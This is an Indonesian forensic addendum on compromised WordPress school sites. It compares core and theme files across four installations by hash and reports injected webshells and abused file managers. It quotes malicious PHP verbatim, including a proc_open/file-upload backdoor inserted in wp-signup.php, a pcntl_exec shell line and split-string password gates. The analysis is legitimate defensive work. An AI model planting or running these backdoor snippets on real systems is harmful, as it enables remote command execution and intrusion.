# Addendum Laporan Fase 3A — temuan yang mengubah gambaran

> Addendum ini **memperluas dan mengoreksi** `LAPORAN-FASE-3A.md`. Semua pekerjaan tetap **read-only**: tidak ada berkas di `D:\smk10november` yang dibuat/diubah/dihapus/dipindah/diganti nama; tidak ada ekstraksi ke disk (isi arsip dibaca di memori); tidak ada eksekusi payload; tidak ada akses jaringan/DB/kredensial.
>
> **Verifikasi integritas penuh (selesai, bukan sebagian):**
> ```
> [*] entri berubah hari ini      : 0
> [*] jumlah file saat ini        : 38906   (acuan awal: 38906)
> ```
> Diperkuat: SHA-256 enam artefak kunci (`wp-admin/includes/admin.php`, `hello-elementor/footer.php`, `mu-plugins/sso-loader.php`, `index.html`, `wp-slgnup.gz`, `themes/archive.php`) di-hash ulang di akhir sesi dan **semuanya masih cocok dengan manifest** → isi bukti tidak berubah selama analisis.
>
> **Koreksi performa:** pada pesan sebelumnya saya menyatakan "tree-walk kini >400 s". Itu **tidak akurat**. Pengukuran bersih menunjukkan **satu penelusuran pohon penuh ±40–80 detik** (dua penelusuran selesai dalam 80 detik pada eksekusi verifikasi ini). Timeout 400 s yang terjadi sebelumnya bersifat **transient** — dipicu rangkaian perintah berat dalam satu panggilan (beberapa penelusuran + `sha256sum` ratusan berkas + grep rekursif) dan/atau kontensi I/O, bukan properti tetap volume ini.

## 0. Mengapa addendum ini ada — koreksi metodologi

Tiga keterbatasan pada analisis saya sebelumnya membuat sebagian temuan **terlewat**:

1. **Pemindaian "lokasi tidak lazim" saya membatasi diri** pada berkas di luar `wp-admin/`, `wp-includes/`, `wp-content/plugins/`, `wp-content/themes/`. Akibatnya **injeksi ke dalam berkas yang tampak sah (file inti WordPress dan tema aktif) tidak tercakup sama sekali.**
2. **Verifikasi Fase 2 memakai regex pada teks mentah**, sehingga teknik evasi `"p"."r"."o"."c"."_"."o"."p"."e"."n"` menghasilkan *false negative*.
3. Saya belum memeriksa **berkas `error_log` yang tersebar di dalam direktori** sebagai kelas bukti tersendiri.

Fase 3A menambahkan empat teknik: **(a)** normalisasi string PHP, **(b)** pemindaian pola perilaku lintas tree, **(c)** **perbandingan sejawat** (`root` vs `sragen` — keduanya WordPress **7.1.3**) dari manifest hash, **(d)** inventarisasi `error_log` sebagai berkas. Semua temuan di bawah berasal dari teknik-teknik ini.

---

## F3A-1 (KRITIS) — Berkas inti WordPress **ditimpa** oleh "PHP File manager ver 1.5"

| Path | Ukuran | SHA-256 |
|---|---|---|
| `wp-admin/includes/admin.php` | 84.070 B | `7841b2f294c38d5213b0fac8256a766de2efb5d8eb8d60f7533549684a38be69` |
| `wp-admin/css/admin.php` | 84.070 B | `7841b2f294c38d5213b0fac8256a766de2efb5d8eb8d60f7533549684a38be69` |
| `wp-admin/images/admin.php` | 84.070 B | `7841b2f294c38d5213b0fac8256a766de2efb5d8eb8d60f7533549684a38be69` |

**Mengapa ini pasti modifikasi, bukan varian resmi:**
- `wp-admin/includes/admin.php` **memang berkas inti WordPress**, dan di **tiga instalasi lain** berkas itu berukuran **3.628 B** dengan hash `b009ef8cc36ff1a4ed9b38da26792acdea1c3af8d623d0e1fe0d2f21ef786d9c` (identik di cibitung, kebumen, sragen).
- `wp-admin/css/admin.php` dan `wp-admin/images/admin.php` berada di direktori yang **tidak pernah** memuat PHP pada WordPress sah.
- Ketiganya berisi **isi yang sama persis** (hash identik) → penanaman massal.

**Identifikasi dari isi berkas (baris 72):**
```
/* PHP File manager ver 1.5 */
$fm_version = 1.4;
```
Kosakata dominan: `fm_config` (55×), `filename` (106×), `return` (106×), `header` (75×), `msg_ntimes`, `destination`, `checksum`, `submit`, `binarydata`, `download`, `archive`, `rename`, `delete`, `fm_login`, `lng_tpl`, `url_inc`.

**Kemampuan yang terbukti dari kode:** manajemen berkas penuh (unggah, unduh, ubah nama, hapus, arsip, checksum), **koneksi MySQL** dari konfigurasi internal (`sql_server`, `sql_username`, `sql_db`, `mysqli(...)` baris 450, pemrosesan pernyataan SQL baris 537, `CREATE TABLE` ditemukan), `phpinfo` (15×), dan autentikasi berbasis form + cookie (`$_POST['login']/['password']`, cookie `<login>|<md5(password)>`, baris 699–705).

> **Aturan 6 dihormati:** kredensial tool (login/password/SQL) **tidak ditampilkan** dalam laporan ini; hanya keberadaan dan mekanismenya yang dilaporkan.

**Risiko: Kritis. Keyakinan: Tinggi.** (Basis: perbandingan sejawat + isi berkas + path yang tidak sah.) Hanya pada instalasi **root**.

---

## F3A-2 (KRITIS) — Injeksi ke dalam **tema aktif** `hello-elementor`

Perbandingan ukuran & hash `hello-elementor/header.php` dan `footer.php` di empat instalasi:

| Instalasi | `header.php` | `footer.php` | Status |
|---|---|---|---|
| root | 1.458 B — `13a01b13c1623559…` | **983 B — `5d42191441e162be…`** | footer **terinjeksi** |
| cibitung | **2.349 B — `8e116d6bee4258ea…`** | 615 B — `00ed612d3fcfa096…` | header **terinjeksi** |
| kebumen | 1.458 B — `13a01b13c1623559…` | 615 B — `00ed612d3fcfa096…` | **bersih** |
| sragen | 1.458 B — `13a01b13c1623559…` | **961 B — `9c6f372fd18180b2…`** | footer **terinjeksi** |

**Isi injeksi:**
- root `footer.php` → upload shell, gate `admin888` (dipecah `'ad'.'mi'.'n8'.'88'`), `move_uploaded_file($_FILES['f']…`, echo `1`.
- sragen `footer.php` → varian upload shell, gate `admin888` (dipecah `'adm'.'in8'.'88'`), `$_FILES['f']`.
- cibitung `header.php` → **RCE**: `pcntl_fork` + `pcntl_exec('/bin/sh', ['-c', $cmd . " > $tmpFile 2>&1"])` (kode sama keluarga dengan `wp-wordfence-security/pcntl.php`).

**Risiko: Kritis. Keyakinan: Tinggi.**
**Implikasi penting:** webshell tidak hanya berada di plugin/tema palsu, tetapi **disisipkan ke dalam tema yang benar-benar aktif** — sehingga pembersihan yang hanya menghapus plugin/tema asing **tidak akan menghilangkan** akses ini.

---

## F3A-3 (KRITIS) — Injeksi ke dalam **berkas inti** di instalasi Cibitung

### a. `smk10novembercibitung.sch.id/wp-signup.php`
- Ukuran **35.118 B**, SHA-256 `f6ced40d344e4bca37be50c44fdcf3ab7186a682cfd5526619fe711c4d275499`
- Pembanding: root & sragen **35.081 B** (`078f7323be6b82644e801964fe3578c6f35d4529a28522e3f8d352398ac0a5df`), kebumen **34.650 B** (`78e4e69c6089eb92…`)
- **Kode disisipkan di awal berkas** (baris 2–18, **sebelum** kode WordPress), terbaca apa adanya:

```
if (isset($_POST['x'])) {
  $a = $_POST['asdf'];
  $descriptors = [['pipe','r'],['pipe','w'],['pipe','w']];
  $handle = proc_open($a, $descriptors, $pipes, null, ['USER' => 'guest']);
  $world = stream_get_contents($pipes[1]);
  print_r("<pre>" . $world);
  die;
}
if (isset($_FILES['cupiUploader'])) {
    chmod(getcwd(), 0755);
    if (move_uploaded_file($_FILES['cupiUploader']['tmp_name'], getcwd() . '/' . $_FILES['cupiUploader']['name'])) {
        echo 'Berhasil mengunggah di ' . getcwd() . '/' . $_FILES['cupiUploader']['name'];
    } else {
```
- **RCE via `POST x` + `POST asdf`**, dan **upload berkas tanpa batasan** via `$_FILES['cupiUploader']` dengan `chmod(getcwd(), 0755)` (menjadikan direktori dapat ditulis). Pesan sukses **berbahasa Indonesia**.
- `wp-signup.php` inti WordPress **tidak pernah** melakukan upload maupun `proc_open` → injeksi pasti.
- **`cupiUploader` hanya ditemukan di satu berkas di seluruh tree** (instalasi Cibitung).

### b. `smk10novembercibitung.sch.id/wp-includes/class-wp-query.php`
- Ukuran **164.389 B**, SHA-256 `f2359cb3ded533b279a88aed3bc3dffd2dccb67cd41e9f17762775777c5cd390`
- Pembanding: root & sragen **164.148 B** (`34b5b13f7c41d83a…`), kebumen **163.975 B** (`efec57b8904f3c98…`)
- **Baris 43 (disisipkan ke dalam logika kelas inti):**
```
$process = proc_open($this->query, $database, $pipes);
```
→ eksekusi lewat shell di dalam kelas query WordPress. `WP_Query` inti tidak pernah memakai `proc_open`.

**Risiko: Kritis. Keyakinan: Tinggi.**

---

## F3A-4 (TINGGI) — `phpFileManager 1.7.9` dengan password kosong (2 salinan, Sragen)

| Path | Ukuran | SHA-256 |
|---|---|---|
| `smk10novembersragen.sch.id/wp-content/themes/archive.php` | 998.842 B | `cae2c22123b91641d6d4df2552cce2bc81d7659bad638976abff63a8910dbbb4` |
| `smk10novembersragen.sch.id/wp-includes/block-supports/archive.php` | 998.842 B | `cae2c22123b91641d6d4df2552cce2bc81d7659bad638976abff63a8910dbbb4` |
| `…/wp-content/themes/archive.zip` | 530.057 B | `cf7bf33a5637738a5af2f1029bdaab5bf2374f441edccca89cf49b2d4298cab7` |
| `…/wp-includes/block-supports/archive.zip` | 530.057 B | `cf7bf33a5637738a5af2f1029bdaab5bf2374f441edccca89cf49b2d4298cab7` |
| `…/wp-content/themes/admin.zip` (berisi `admin.php` 39.353 B) | 9.073 B | `357de3c4cfe20233ceb36cbdff66fddc91e6f9be188ce01a03779a69f7d018ad` |

- Identifikasi dari header: **`phpFileManager 1.7.9` — By Fabricio Seger Kolling** (perangkat lunak sah pihak ketiga, disalahgunakan).
- Konfigurasi tertanam: `auth_pass = d41d8cd98f00b204e9800998ecf8427e` = **MD5 string kosong** (dibuktikan: `printf '' | md5sum` → nilai yang sama) ⇒ **tanpa autentikasi efektif**.
- Anggota arsip **identik byte** dengan berkas on-disk (diverifikasi: sha256 sama).
- Kemampuan: `system`×50, `shell_exec`×6, `passthru`×9, `proc_open`×6, `popen`×8, `pcntl_exec`×7, `chmod`×146, `phpinfo`×27.

**Risiko: Kritis. Keyakinan: Tinggi.**

---

## F3A-5 (TINGGI) — 622 berkas `error_log` = **212,56 MB** (bukti probing/eksekusi massal)

| Instalasi | Jumlah berkas `error_log` | Total ukuran |
|---|---|---|
| cibitung | 214 | **102,07 MB** |
| kebumen | 214 | 29,75 MB |
| root | 97 | 5,04 MB |
| sragen | 97 | 75,71 MB |
| **Total** | **622** | **212,56 MB** |

Tersebar di dalam `wp-content/` (163 di cibitung & kebumen), `wp-includes/` (48–84), `wp-admin/` (2–4).

**Terbesar:** `cibitung/error_log` **104.499.186 B** (`6b0fdf1308886e1f…`), `sragen/error_log` **76.518.116 B** (`d2470185abbd3940…`), `kebumen/error_log` **28.996.595 B** (`82f20a788b6d0f78…`), root `error_log` 1.771.807 B.

**Isi dua contoh (analisis bertahap, mask):
- `wp-includes/error_log` (root, 746.261 B, 10.473 baris, 2.609 fatal; rentang 06-Mar-2026 04:44 → 12-Okt-2026 10:40):
  ```
  1013  Uncaught Error: Class 'X' not found
   683  Uncaught Error: Call to undefined function _deprecated_file()
   227  Uncaught Error: Undefined constant 'X'
   196  Uncaught Error: Call to undefined function feed_content_type()
   162  Uncaught Error: Call to undefined function get_the_block_template_html()
   114  Uncaught Error: Call to undefined function _wp_can_use_pcre_u()
   ...
  ```
- `wp-admin/includes/error_log` (root, 426.745 B, 5.612 baris, 1.403 fatal): pola sama (`Class 'X' not found` 996×, `Undefined constant` 148×, `undefined function __()/get_locale()/add_filter()`).

**Interpretasi:** galat seperti *"Class/function/constant tidak ditemukan"* adalah tanda khas **berkas PHP dijalankan langsung lewat HTTP tanpa memuat WordPress** (bootstrap tidak ada). Ribuan entri di dalam `wp-includes/` dan `wp-admin/includes/` ⇒ **jejak probing/eksploitasi otomatis massal** terhadap berkas internal WordPress. Ini juga menjelaskan mengapa `error_log` muncul di hampir setiap direktori.
**Status:** sebagian besar dari 212 MB ini **belum dianalisis**; ia menyimpan daftar path yang diakses dan kerangka waktu percobaan, sehingga menjadi sumber IoC besar untuk fase berikutnya.
**Risiko: Tinggi (sebagai bukti aktivitas & sumber IoC). Keyakinan: Tinggi** untuk interpretasi pola galat.

---

## F3A-6 (RENDAH) — Artefak/keanehan yang **BUKAN** malware

| Path | Ukuran | SHA-256 | Penilaian |
|---|---|---|---|
| `wp-admin/includes/Il0/about.php` (root) | 0 B | `e3b0c44298fc1c14…` (hash berkas kosong) | Berkas kosong; tidak mengeksekusi apa pun |
| `wp-admin/network/site-cloud.php` (root) | 8 B | `c6e257a6cfadc13f…` | Isi teks `sadasdas`, **tanpa tag PHP** |
| `smk10novembersragen.sch.id/wp-admin/state.php` | 405 B | `eea9347b1e266ca5…` | **Identik dengan `index.php` WordPress** (salinan berganti nama) |

Ketiganya tidak memiliki kemampuan eksekusi/unggah/obfuscation. **Status: belum dapat dipastikan sebagai artefak serangan** — kemungkinan artefak penyalinan/uji. Perlu konfirmasi dari pihak yang membuat salinan.

---

## Ringkasan peta akhir per instalasi (setelah addendum)

| Instalasi | Versi | Kelas artefak yang terkonfirmasi |
|---|---|---|
| **root** | 7.1.3 | **File inti ditimpa** (`wp-admin/includes/admin.php` → file manager 84 KB) + 2 salinan tanam; injeksi upload shell ke `hello-elementor/footer.php`; `wp_edvl/404.php` (RCE XOR); `wp-slgnup.gz` (SEO cloaking + C2); `mu-plugins/sso-loader.php`; `info.php`; defacement `index.html`; 97 × `error_log` |
| **cibitung** | 6.9.1 | **Injeksi berkas inti**: `wp-signup.php` (RCE + upload `cupiUploader`) & `class-wp-query.php` (`proc_open`); injeksi pcntl RCE ke `hello-elementor/header.php`; plugin palsu `wp-wordfence-security/{proc,pcntl}.php`; `info.php`; `.htaccess` "Allow from all" ×2; `wp-loadss.php`; plugin ter-rename `ioyntkq`; stub `wp-db-optimizer`; `lvcibfqxpseo` kosong; `error_log` 102 MB |
| **kebumen** | 6.9.9 | Cluster **SEO doorway** `prestasi/` (`index.php`, `bb.php`, `home.php`, `lol.txt`, `urls.txt`, `site1–4.xml`). Berkas tema bersih; **tidak ditemukan** webshell RCE/injeksi pada pola yang diuji; `error_log` 29,8 MB |
| **sragen** | 7.1.3 | **phpFileManager ×2 (password kosong)**; injeksi upload shell ke `hello-elementor/footer.php`; `uvisyfyj/index.php` (upload shell); `wp_zqyq/404.php` (RCE XOR); `goodsdetails.php` + `shopsdetails.php` + 7 arsip dropper; `admin.zip`/`admin.php`; `mu-plugins/sso-loader.php`; `state.php` (salinan `index.php`); `error_log` 76,5 MB |

**Tetap tidak dapat disimpulkan:** tidak ada bukti bahwa keempat instalasi dikompromikan lewat **satu jalur masuk yang sama**. Pola IoC tetap **terpisah per situs**, dengan teknik yang berbeda (file-manager vs injeksi file inti vs RCE plugin vs SEO doorway). Penetapan *initial access* memerlukan log akses HTTP/web server.

---

## Revisi terhadap laporan utama

| Bagian | Revisi |
|---|---|
| §3.3 "PHP di lokasi tidak lazim" | **Tidak lengkap.** Daftar di addendum ini adalah **superset** (menambahkan injeksi ke berkas inti & tema aktif yang sebelumnya tidak dipindai). |
| §3.2 "kebumen: tidak ada webshell RCE" | **Masih berlaku** untuk pola yang diuji (`eval`/`base64_decode`/`gzinflate`/`pcntl`/`proc_open`/`move_uploaded_file`/`$_GET['g']`), dan **diperkuat**: `hello-elementor` kebumen bersih (615/1.458 B, hash sama dengan instalasi bersih). |
| §2.2 klaim Fase 2 atas `proc.php` | Benar secara **fungsi** (`proc_open($_GET['data-admin'])`), tetapi **literalnya dipecah** — lihat tabel teknik evasi §2.2 laporan utama. |
| §8 item 2 (verifikasi inti) | **Sebagian terbuka:** perbandingan **sejawat** (root vs sragen, sama-sama 7.1.3) sudah menunjukkan 6 berkas hanya-di-root + 5 berkas berbeda di `wp-admin/`. Ini **bukan** verifikasi terhadap paket resmi — paket **tetap belum tersedia** dan §8 item 2 tetap **BLOCKED** untuk verifikasi resmi. |
